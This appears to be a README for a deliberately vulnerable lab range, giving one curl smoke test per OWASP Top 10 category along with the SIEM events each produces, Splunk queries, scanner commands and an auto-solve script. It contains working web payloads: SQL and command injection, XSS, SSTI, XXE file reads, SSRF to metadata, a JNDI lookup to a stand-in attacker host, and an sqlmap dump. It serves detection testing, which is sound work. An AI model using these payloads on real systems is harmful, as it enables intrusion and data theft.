# OWASP Top 10 test commands

One command per OWASP Top 10 2021 category, with the detection event each one
produces. These are the *smoke tests* — run them to prove the range and the SIEM
pipeline work. For the full exploitation walkthroughs with flags, MITRE mapping
and SPL, see [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md).

Run them only against an isolated lab host.

```bash
export TARGET="http://127.0.0.1:5005"        # or http://iis-lab.internal:8080
curl -fsS "$TARGET/health"
```

Tag a run so you can isolate it in Splunk:

```bash
export TAG='X-Lab-Test-ID: smoke-run-1'
```

## A01 — Broken Access Control

```bash
curl -sS -H "$TAG" "$TARGET/api/users/1337"
curl -sS -H "$TAG" --get --data-urlencode 'file=../flagstore/traversal.flag' \
  "$TARGET/api/documents/download"
```

Events: `broken_access_attempt allowed=true`, `path_traversal_attempt`.
Use cases: UC-04, UC-08. Challenges: `access-idor`, `file-traversal`.

## A02 — Cryptographic Failures

```bash
curl -sS -H "$TAG" "$TARGET/api/backup"
curl -sS -H "$TAG" "$TARGET/admin/panel"
```

Events: `sensitive_data_exposure`, `admin_panel_access granted=false`.
Use cases: UC-02, UC-14. Challenges: `auth-weak-secret`, `auth-reset-token`.

## A03 — Injection

```bash
curl -sS -H "$TAG" --get --data-urlencode "q=' OR 1=1--" "$TARGET/api/products/search"
curl -sS -H "$TAG" --get --data-urlencode 'name=<script>alert(1)</script>' "$TARGET/reflect"
curl -sS -H "$TAG" --get --data-urlencode 'host=127.0.0.1; id' "$TARGET/api/diagnostics/ping"
curl -sS -H "$TAG" --get --data-urlencode 'template={{7*7}}' "$TARGET/api/newsletter/preview"
```

Events: `sql_query suspicious=true`, `xss_probe`, `command_injection_attempt`
plus `command_execution`, `ssti_attempt`.
Use cases: UC-06, UC-07, UC-09, UC-10.

`command_execution` is the highest-fidelity event the range produces — if only
one detection gets built from this lab, build that one.

## A04 — Insecure Design

```bash
curl -sS -H "$TAG" -X POST "$TARGET/api/checkout" -H 'Content-Type: application/json' \
  -d '{"quantity":-5,"unit_price":100}'
printf 'test' > /tmp/t.php && curl -sS -H "$TAG" -X POST "$TARGET/api/upload" -F 'file=@/tmp/t.php'
```

Events: `business_logic_abuse negative_total=true`, `dangerous_upload`.
Use cases: UC-17, UC-12.

## A05 — Security Misconfiguration

```bash
curl -sS -H "$TAG" "$TARGET/api/debug/config"
curl -sS -H "$TAG" "$TARGET/.env"
curl -sS -H "$TAG" "$TARGET/backups/"
curl -sS -H "$TAG" -X POST "$TARGET/api/suppliers/import" -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/hostname">]><r>&e;</r>'
```

Events: `debug_endpoint_access`, `sensitive_file_access`,
`directory_listing_access`, `xxe_attempt`.
Use cases: UC-03, UC-02, UC-11.

## A06 — Vulnerable and Outdated Components

```bash
curl -sS -H "$TAG" "$TARGET/api/components"
curl -sS -H "$TAG" -H 'X-Audit-Agent: ${jndi:ldap://attacker.lab.invalid/a}' "$TARGET/api/legacy/audit"
```

Events: `outdated_component_inventory`, `jndi_lookup_detected`.
Use case: UC-18.

The component versions are simulated, not installed dependencies, and the JNDI
lookup is recorded without ever being resolved. No outbound LDAP request is made.

## A07 — Identification and Authentication Failures

```bash
for i in 1 2 3 4 5 6; do
  curl -sS -H "$TAG" -X POST "$TARGET/api/login" -H 'Content-Type: application/json' \
    -d '{"username":"svc_backup","password":"wrong"}'
done
curl -sS -H "$TAG" -X POST "$TARGET/api/login" -H 'Content-Type: application/json' \
  -d '{"username":"svc_backup","password":"summer2024"}'
```

Events: repeated `authentication_attempt success=false`, then
`brute_force_suspected lockout_applied=false`, then a success.
Use case: UC-13. The failure-then-success sequence is the alert that matters.

## A08 — Software and Data Integrity Failures

```bash
curl -sS -H "$TAG" -X POST "$TARGET/api/preferences/import" -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
curl -sS -H "$TAG" -X POST "$TARGET/api/profile/update" -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

Events: `unsigned_data_import signature_checked=false`,
`privilege_change mechanism=mass_assignment`.
Use case: UC-05.

## A09 — Security Logging and Monitoring Failures

```bash
curl -sS -H "$TAG" -X POST "$TARGET/api/quiet-transfer" -H 'Content-Type: application/json' \
  -d '{"amount":9999}'
```

Event: `monitoring_gap_simulated` with deliberately missing actor and destination.
Use case: UC-19. This one teaches by absence — the event exists but cannot be
attributed, which is the point.

## A10 — Server-Side Request Forgery

```bash
curl -sS -H "$TAG" --get --data-urlencode 'url=http://metadata:8080/latest/meta-data/' \
  "$TARGET/api/fetch"
curl -sS -H "$TAG" --get --data-urlencode 'url=http://169.254.169.254/' "$TARGET/api/fetch"
```

Event: `ssrf_probe`. Use case: UC-16.

Egress is bounded to an allow-list of lab-internal hosts, so this cannot be used
to reach your corporate network. Outside Docker the metadata service is on
`http://127.0.0.1:8080`.

## Confirm everything landed

```bash
jq -r 'select(.test_id=="smoke-run-1") | .event_type' logs/meridian-events.jsonl | sort | uniq -c
```

```spl
index=vapt_lab sourcetype=helpag:owasp:json test_id="smoke-run-1"
| stats count by event_type severity
| sort - count
```

## Scanner commands

```bash
nuclei -u "$TARGET" -severity low,medium,high,critical -jsonl -o nuclei.jsonl
katana -u "$TARGET" -jc -d 3 -o katana-urls.txt
httpx -u "$TARGET" -status-code -title -tech-detect
ffuf -u "$TARGET/FUZZ" -w wordlists/meridian-paths.txt -mc all -of json -o ffuf.json
gobuster dir -u "$TARGET" -w wordlists/meridian-paths.txt -o gobuster.txt
sqlmap -u "$TARGET/api/products/search?q=test" -p q --batch --dbms=sqlite --dump -T flags
```

Run a scanner and the playbook chain back to back, then compare what your alerts
produced for each. Section 8 of [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md) explains why
that comparison is the most useful tuning exercise on this range.

## Full automated run

```bash
./tools/validate_range.sh "$TARGET"
```

Solves all 22 challenges, submits every flag, and reports pass/fail.
